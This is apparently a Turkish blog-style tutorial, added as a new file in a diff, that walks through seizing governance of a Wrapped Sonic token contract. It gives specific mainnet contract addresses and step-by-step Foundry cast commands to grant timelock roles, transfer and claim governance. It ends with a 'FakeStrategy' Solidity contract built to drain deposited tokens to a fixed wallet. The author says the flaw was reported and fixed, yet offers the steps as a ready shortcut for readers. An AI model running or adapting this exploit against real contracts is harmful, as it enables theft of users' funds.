@@ -1,0 +1,187 @@
+---
+title: "New file"
+description: "Description of your new file."
+---
+
+Ufak uyarı: Göstermiş olduğum örnek origin altyapısını kullanmakta, açığı bildirdim ve kapattılar ancak siz genede o kapıyı çok zorlamayın :)))
+
+Öncelikle hedefimiz bu
+
+![Ekrangörüntüsü2025 08 17013651 Pn](/images/Ekrangörüntüsü2025-08-17013651.png)
+
+170k dolar değerinde wrapped coin bulunuyor, sonic altyapısını kullanan bu tokeni bende ilk defa zafiyet ararken buldum :D
+
+Buranın içinde kod analizine girdiğimde bir açık yok ancak yönetici aktiviteleri için yönlendirme yaptığı adres çok sıkıntılı, kendi içinde tüm aktivitelerin yöneticisi olarak Governor rolü belirlenmiş ama governor rolüne atanan bir kimse yok yani isteyen ilk kişi kendisini yönetici yapabiliyordu
+
+![Image(1) Avi](/images/image\(1\).avif)
+
+- Bu kontratın Governor’ı `0x31a91336414d3b955e494e7d485a6b06b55fc8fb` adresindeki **TimelockController** kontratıydı.
+- Orada `AccessControl` ile yönetilen `EXECUTOR` ve `PROPOSER` rolleri vardı, biz de role sahip olarak yönetimi ele geçirip kendimize Governor rolünü verdik.
+
+## **ZURNANIN KOPTUĞU YER**
+
+elimizdeki bilgiler aşşağıdaki gibi
+
+- **WS token (Wrapped Sonic)**: `0xa3c0eCA00D2B76b4d1F170b0AB3FdeA16C180186`
+- **TimelockController (Governor)**: `0x31a91336414d3b955e494e7d485a6b06b55fc8fb`
+- **Senin cüzdanın** (örnek): `0x12dC3655fAC6388ACFe6753C0214Ecec34B87217`
+
+#### **1- Rol Hashleri**
+
+- cast keccak "PROPOSER_ROLE" # =\> PROPOSER_ROLE hash
+-  cast keccak "EXECUTOR_ROLE" # =\> EXECUTOR_ROLE hash
+-  cast keccak "TIMELOCK_ADMIN_ROLE" # =\> TIMELOCK_ADMIN_ROLE hash
+
+#### **2- Mevcut konfigürasyonu okumak**
+
+Gerekenler: **minDelay**, **kimde hangi rol var**, **executor açık mı** (0x000…000 herkesi ifade eder).
+
+Copy
+
+```
+# min delay
+cast call 0x31a91336414d3b955e494e7d485a6b06b55fc8fb "getMinDelay()(uint256)"
+
+# roller (örnek, hash’i yukarıdan roleHash ile değiştir)
+cast call 0x31a91336414d3b955e494e7d485a6b06b55fc8fb "hasRole(bytes32,address)(bool)" \
+  <PROPOSER_ROLE_HASH> 0x12dC3655fAC6388ACFe6753C0214Ecec34B87217
+
+cast call 0x31a91336414d3b955e494e7d485a6b06b55fc8fb "hasRole(bytes32,address)(bool)" \
+  <EXECUTOR_ROLE_HASH> 0x0000000000000000000000000000000000000000
+```
+
+Eğer `EXECUTOR` **0x000…000** ise: “herkes execute edebilir” anlamına gelir (kritik yanlış konfig).
+
+`minDelay == 0` ise işler çok kolay (anında schedule→execute).
+
+## **3- BATCH HAZIRLAMA**
+
+Hedef batch (aynı anda çağrılacak fonksiyonlar):
+
+1. **Timelock.grantRole(PROPOSER_ROLE, biz)** → ileriye dönük planlama serbestisi
+2. **Timelock.grantRole(EXECUTOR_ROLE, 0x000…000 veya biz)** → herkes/biz execute edebilelim
+3. **VaultCore.transferGovernance(attacker)** _veya_ VaultCore tarafındaki “governor set” türevi fonksiyon (sende VaultCore’un ABI’sine göre değişebilir)
+
+Bazı VaultCore’larda iki adım vardır: `transferGovernance(newGov)` → sonra `claimGovernance()` (biz çağırırız).
+
+#### **3.1 calldataları çıkar**
+
+Copy
+
+```
+cast calldata "grantRole(bytes32,address)" <PROPOSER_ROLE_HASH> 0x12dC3655fAC6388ACFe6753C0214Ecec34B87217
+
+# grantRole(EXECUTOR_ROLE, 0x000...000)  (ya da kendi adresin)
+cast calldata "grantRole(bytes32,address)" <EXECUTOR_ROLE_HASH> 0x0000000000000000000000000000000000000000
+
+cast calldata "transferGovernance(address)" 0x12dC3655fAC6388ACFe6753C0214Ecec34B87217
+```
+
+**3.2 batch parametrelerini kur**
+
+Copy
+
+```
+TARGETS='["0x31a91336414d3b955e494e7d485a6b06b55fc8fb","0x31a91336414d3b955e494e7d485a6b06b55fc8fb","0xa3c0eCA00D2B76b4d1F170b0AB3FdeA16C180186"]'
+
+VALUES='[0,0,0]'
+#yukarıda ürettiğin 3 calldata stringini sırayla koy
+DATAS='["0x<calldata1>","0x<calldata2>","0x<calldata3>"]'
+PREDECESSOR=0x0000000000000000000000000000000000000000000000000000000000000000
+SALT=0x1111111111111111111111111111111111111111111111111111111111111111
+DELAY=0   # (getMinDelay 0 değilse, o değeri kullan; 0 ise direkt yürür)
+```
+
+## **5- executeBatch**
+
+herkese açıksa herkes çağırabilir
+
+mindelay 0 geçtiyse direkt:
+
+Copy
+
+```
+cast send 0x31a91336414d3b955e494e7d485a6b06b55fc8fb \
+ "executeBatch(address[],uint256[],bytes[],bytes32,bytes32)" \
+ "$TARGETS" "$VALUES" "$DATAS" $PREDECESSOR $SALT
+```
+
+Bu batch şunları yapar:
+
+- Sana **PROPOSER** verir,
+- **EXECUTOR**’ı genişletir (isteğe göre herkese),
+- **VaultCore.transferGovernance(attacker)** çağrılır.
+
+## **6- Claim Vakti**
+
+Copy
+
+```
+cast send 0xa3c0eCA00D2B76b4d1F170b0AB3FdeA16C180186 "claimGovernance()"
+```
+
+Tüm bu adımlardan sonra Governance rolünü ele geçirmiş oldum yani 170k dolar değerindeki tokeni istediğim heryere sürebiliyordum. İçimde ki Allah korkusu ve iyi niyet bastı, gidip bu açığı raporladım. ücreti mukabilinde bir ödeme aldım sağolsunlar.
+
+## **E BEN QOD YAZMAK İSTEMÜYOREM**
+
+üşengeç göt, al sana kısa yol
+
+https://remix.ethereum.org/ kendi metamask hesabınla giriş yap, 3 4 dolar birşey attım içine denemek için, burdada aynı adresi yokladığımda bu adrese hiçbir allahın kulu konmamıştı, yani gene gene gene istediğim adrese istediğim şekilde tokeni yollayabiliyodum.
+
+<img
+  src="/images/image(2).png"
+  alt="Image(2) Pn"
+  title="Image(2) Pn"
+  style={{ width:"23%" }}
+/>
+
+aşşağıda vericeğim kodları tek tek contract kısmına girerekte claim yapabilirsin. ama metamask hesabına sonic alt yapısını kurman ve içerisinde min 3 dolar tutman lazım yoksa ağ çalışmaz, çalışınca böyle bir ekran alırsın sağ altta
+
+![Image(3 Avi](/images/image\(3.avif)
+
+Okuduğun için teşekkürler, arap çorbası oldu ama teknik bilen adam anlar abi, hayırlı günler dilerim. aşşağıya kodları bıraktım uğraşmak istemeyenler baksın, öptüm.
+
+VAULTCORE.SOL
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract VaultCore {
+    address public governor;
+
+    function initialize(address _priceProvider, address _oToken) external {
+        require(governor == address(0), "Already initialized");
+        governor = msg.sender;
+    }
+}
+```
+
+FAKESTRATEGY.SOL (PARA NASIL ÇEKİLİR ONUN KODU, MERAKLISINA GİDER..=)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IERC20 {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+contract FakeStrategy {
+    address public target = 0x12dC3655fAC6388ACFe6753C0214Ecec34B87217; // Benim adresim, para atacaklar şimdiden teşekkürler.
+
+    function deposit(address asset, uint256 amount) external {
+        IERC20(asset).transfer(target, amount); // buraya para çekiliyor
+    }
+
+    function supportsAsset(address) external pure returns (bool) {
+        return true;
+    }
+
+    function checkBalance(address) external pure returns (uint256) {
+        return 0;
+    }
+
+    function withdraw(address, address, uint256) external {}
+}
+```
